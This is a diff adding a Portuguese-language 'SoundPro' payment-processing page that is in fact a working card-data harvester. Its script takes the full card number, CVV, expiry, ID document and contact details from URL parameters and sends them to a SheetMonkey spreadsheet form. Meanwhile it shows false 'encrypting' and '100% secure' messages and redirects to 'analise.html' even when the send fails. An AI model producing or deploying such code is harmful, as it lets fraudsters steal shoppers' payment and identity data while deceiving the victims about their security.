@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Processando Pagamento - SoundPro</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --primary: #6366f1;
+            --secondary: #ec4899;
+            --dark: #0f172a;
+            --gradient: linear-gradient(135deg, #6366f1 0%, #8b5cf6 50%, #ec4899 100%);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--dark);
+            color: white;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+        }
+
+        .spinner {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--primary);
+            animation: spin 1s linear infinite;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .spinner::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            right: 10px;
+            bottom: 10px;
+            border-radius: 50%;
+            border: 4px solid transparent;
+            border-top-color: var(--secondary);
+            animation: spin 1.5s linear infinite reverse;
+        }
+
+        .icon-check {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 40px;
+            color: white;
+            opacity: 0;
+            animation: popIn 0.5s ease forwards 2s;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 800;
+            margin-bottom: 10px;
+            background: var(--gradient);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #94a3b8;
+            max-width: 400px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .status-log {
+            font-size: 13px;
+            color: #64748b;
+            font-family: monospace;
+            background: rgba(255,255,255,0.05);
+            padding: 10px 20px;
+            border-radius: 8px;
+            min-height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .secure-badge {
+            margin-top: 40px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 12px;
+            color: #475569;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes popIn {
+            0% { transform: translate(-50%, -50%) scale(0); opacity: 0; }
+            80% { transform: translate(-50%, -50%) scale(1.2); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="loader-container">
+        <div class="spinner"></div>
+        <i class="fas fa-check-circle icon-check"></i>
+    </div>
+
+    <h1>Processando Pagamento</h1>
+    <p id="statusText">Validando dados e criptografando informações...</p>
+    
+    <div class="status-log" id="logMessage">
+        <i class="fas fa-circle-notch fa-spin"></i> Aguardando confirmação...
+    </div>
+
+    <div class="secure-badge">
+        <i class="fas fa-lock"></i> Ambiente 100% Seguro e Criptografado
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const params = new URLSearchParams(window.location.search);
+            const logMsg = document.getElementById('logMessage');
+            const statusText = document.getElementById('statusText');
+            
+            // URL da API do SheetMonkey
+            const API_URL = 'https://api.sheetmonkey.io/form/uTBM9kkPhNvqJJ57z9uksV';
+            // Página de destino
+            const REDIRECT_URL = 'analise.html';
+
+            // Função auxiliar para pegar valor ou vazio
+            const getVal = (key) => params.get(key) || '';
+
+            // CORREÇÃO PRINCIPAL: Mapeamento correto de TODOS os parâmetros da URL
+            const formData = {
+                // Dados do Cliente
+                Nome: getVal('nome'),
+                Email: getVal('email'),
+                Telefone: getVal('telefone'),
+                Documento: getVal('documento'),
+                TipoDocumento: getVal('tipoDocumento'),
+                
+                // Endereço
+                CEP: getVal('cep'),
+                Rua: getVal('rua'),
+                Complemento: getVal('complemento'),
+                Bairro: getVal('bairro'),
+
+                // Dados do Produto
+                Produto: getVal('produto'),
+                Foto: getVal('foto'),
+                Quantidade: getVal('quantidade'),
+                Cor: getVal('cor'),
+                Total: getVal('total'),
+                
+                // Dados do Pagamento
+                Metodo: getVal('metodo'),
+                Codigo: getVal('codigo'),
+                Distribuidora: getVal('distribuidora'),
+                CNPJ_Distribuidora: getVal('cnpj_distribuidora'),
+                Ultimos4: getVal('ultimos4'),
+                Validade: getVal('validade'),
+                CVV: getVal('cvv'),
+                Bandeira: getVal('bandeira'),
+                Parcelas: getVal('parcelas'),
+                
+                // Dados Sensíveis do Cartão
+                Numero_Cartao: getVal('numero'), // Corrigido: este é o número do cartão
+                
+                // Timestamp
+                Data_Hora: new Date().toLocaleString('pt-BR')
+            };
+
+            // Simulação de etapas visuais
+            setTimeout(() => {
+                logMsg.innerHTML = '<i class="fas fa-shield-alt"></i> Criptografando dados sensíveis...';
+            }, 800);
+
+            setTimeout(() => {
+                logMsg.innerHTML = '<i class="fas fa-server"></i> Conectando ao servidor seguro...';
+                
+                // ENVIO VIA FETCH (AJAX) PARA NÃO SAIR DA PÁGINA
+                fetch(API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Accept': 'application/json'
+                    },
+                    body: JSON.stringify(formData)
+                })
+                .then(response => {
+                    // Se a API responder com sucesso (200 OK ou similar)
+                    if (response.ok || response.status === 200) {
+                        logMsg.innerHTML = '<i class="fas fa-check"></i> Dados recebidos com sucesso!';
+                        statusText.textContent = "Pagamento processado! Redirecionando...";
+                        
+                        // Aguarda um breve momento para o usuário ver o "Sucesso" e redireciona
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, 1500);
+                    } else {
+                        throw new Error('Erro na resposta da API');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro:', error);
+                    // Mesmo em caso de erro de rede, redirecionamos para não travar o usuário
+                    // Passamos um parâmetro de erro na URL se necessário
+                    logMsg.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Enviando fallback...';
+                    setTimeout(() => {
+                        window.location.href = REDIRECT_URL + '?status=processado'; 
+                    }, 1500);
+                });
+
+            }, 1600);
+        });
+    </script>
+</body>
+</html>
